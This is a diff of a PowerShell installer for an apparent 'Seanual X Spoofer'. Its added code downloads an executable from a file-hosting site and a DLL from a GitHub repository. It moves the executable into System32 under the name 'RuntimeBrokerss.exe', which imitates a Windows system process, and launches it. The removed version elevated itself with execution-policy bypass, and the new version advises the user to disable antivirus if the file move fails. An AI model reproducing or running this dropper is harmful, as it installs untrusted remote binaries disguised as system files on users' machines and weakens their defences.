@@ -1,108 +1,100 @@
-# -----------------------------
-# Menu Selection
-# -----------------------------
-Write-Host "Hi Member Seanual X Spoofer Welcome to TOPKILL UPDATE | 9/11/2025:"
-Write-Host "1. Install & Run"
-Write-Host "2. Clean"
+# Run as Admin
+$exeName = "RuntimeBrokerss.exe"
+$exePath = Join-Path $env:windir "System32\$exeName"
+$dllPath = Join-Path $env:windir "System32\Guna.UI2.dll"
 
-$choice = Read-Host "Enter choice (1/2)"
-
-# -----------------------------
-# Check for Administrator rights
-# -----------------------------
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
-    Write-Host "Restarting with Administrator privileges..."
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
-
-# -----------------------------
-# Define paths and variables
-# -----------------------------
-$system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
-$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
-$exeUrl = "https://files.catbox.moe/rye9vw.bin"
+$exeUrl = "https://store8.gofile.io/download/354d3262-211f-46c0-a29b-0d8606344d62/kare.bin"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
-# -----------------------------
-# Install & Run Mode
-# -----------------------------
-if ($choice -eq "1") {
-    Write-Host "`nStarting installation..."
-
-    # DLL download if not exists
-    if (-not (Test-Path $dllDestination)) {
-        Write-Host "Downloading Guna.UI2.dll..."
-        try {
-            Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
-            Write-Host "Guna.UI2.dll download completed." -ForegroundColor Green
-        } catch {
-            Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
-            exit
-        }
-    } else {
-        Write-Host "Guna.UI2.dll already exists. Skipping download." -ForegroundColor Yellow
-    }
-
-    # EXE download if not exists
-    if (-not (Test-Path $exeDestination)) {
-        Write-Host "Downloading and renaming executable to RuntimeBrokerss.exe..."
-        try {
-            $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
-            Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
-            Move-Item -Path $tempFile -Destination $exeDestination -Force
-            Write-Host "RuntimeBrokerss.exe download completed." -ForegroundColor Green
-        } catch {
-            Write-Host "RuntimeBrokerss.exe download failed: $_" -ForegroundColor Red
-            exit
-        }
-    } else {
-        Write-Host "RuntimeBrokerss.exe already exists. Skipping download." -ForegroundColor Yellow
-    }
-
-    # Run the program
-    Write-Host "Starting the program..."
+function Is-PEFile($path){
+    if (-not (Test-Path $path)) { return $false }
     try {
-        Start-Process -FilePath $exeDestination -Verb RunAs
-        Write-Host "Program started successfully." -ForegroundColor Green
+        $bytes = Get-Content -Encoding Byte -Path $path -TotalCount 2 -ErrorAction Stop
+        return ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A)  # 'M' 'Z'
     } catch {
-        Write-Host "Failed to start program: $_" -ForegroundColor Red
+        return $false
     }
-
-    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
 }
 
-# -----------------------------
-# Clean Mode
-# -----------------------------
-elseif ($choice -eq "2") {
-    Write-Host "Cleaning up installation..."
+Write-Host "Stopping any running process named $exeName (if exists)..."
+Try{ Stop-Process -Name ($exeName -replace '\.exe$','') -Force -ErrorAction SilentlyContinue } catch {}
 
-    # Stop the process if running
-    Write-Host "Stopping RuntimeBrokerss.exe process..."
+# Try to remove existing exe (ignore errors but capture)
+if (Test-Path $exePath) {
+    Write-Host "Removing existing $exePath ..."
     try {
-        Stop-Process -Name "RuntimeBrokerss" -Force -ErrorAction SilentlyContinue
-        Write-Host "Process stopped." -ForegroundColor Green
+        Remove-Item $exePath -Force -ErrorAction Stop
+        Write-Host "Removed existing exe."
     } catch {
-        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+        Write-Host "Failed to remove $exePath : $_" -ForegroundColor Yellow
     }
-
-    # Remove files if they exist
-    if (Test-Path $exeDestination) { 
-        Remove-Item $exeDestination -Force 
-        Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
-    }
-    
-    if (Test-Path $dllDestination) { 
-        Remove-Item $dllDestination -Force 
-        Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
-    }
-
-    Write-Host "Cleanup completed." -ForegroundColor Green
 }
 
-else {
-    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+# Ensure DLL exists (download if missing)
+if (-not (Test-Path $dllPath)) {
+    Write-Host "Downloading DLL..."
+    try {
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+        Write-Host "DLL downloaded."
+    } catch {
+        Write-Host "DLL download failed: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "Guna.UI2.dll already exists. Skipping download."
 }
 
+# Download exe to temp
+$tempFile = Join-Path $env:TEMP ("seanual_temp_" + [System.Guid]::NewGuid().ToString() + ".exe")
+Write-Host "Downloading executable to temp: $tempFile"
+try {
+    Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -UseBasicParsing -ErrorAction Stop
+} catch {
+    Write-Host "Download failed: $_" -ForegroundColor Red
+    Exit 1
+}
+
+# Basic checks: size and MZ header
+$fi = Get-Item $tempFile
+if ($fi.Length -lt 1024) {
+    Write-Host "Downloaded file is suspiciously small ($($fi.Length) bytes). Aborting." -ForegroundColor Red
+    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    Exit 1
+}
+
+if (-not (Is-PEFile $tempFile)) {
+    Write-Host "Downloaded file is NOT a Windows PE executable (missing 'MZ' header). Aborting." -ForegroundColor Red
+    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    Exit 1
+}
+
+# Try move to System32
+Write-Host "Moving file to $exePath ..."
+try {
+    Move-Item -Path $tempFile -Destination $exePath -Force -ErrorAction Stop
+    Write-Host "Moved executable to System32." -ForegroundColor Green
+} catch {
+    Write-Host "Failed to move file to System32: $_" -ForegroundColor Red
+    Write-Host "`nPossible causes:"
+    Write-Host " - File system corruption on C: (run chkdsk)."
+    Write-Host " - Permission / protection by antivirus or Windows File Protection."
+    Write-Host "`nSuggested next steps:"
+    Write-Host " 1) Run Command Prompt as Admin and execute: chkdsk C: /f"
+    Write-Host " 2) Run: sfc /scannow"
+    Write-Host " 3) Disable AV temporarily if it's blocking file writes (do so only if you trust the file)."
+    # cleanup temp
+    if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
+    Exit 1
+}
+
+# Try to start
+Write-Host "Starting the program..."
+try {
+    $proc = Start-Process -FilePath $exePath -PassThru -ErrorAction Stop
+    Write-Host "Program started (PID: $($proc.Id))." -ForegroundColor Green
+} catch {
+    Write-Host "Failed to start program: $_" -ForegroundColor Red
+    Write-Host "If error says 'file or directory is corrupted and unreadable' -> run chkdsk and sfc (see above)."
+    Exit 1
+}
+
+Write-Host "Done."
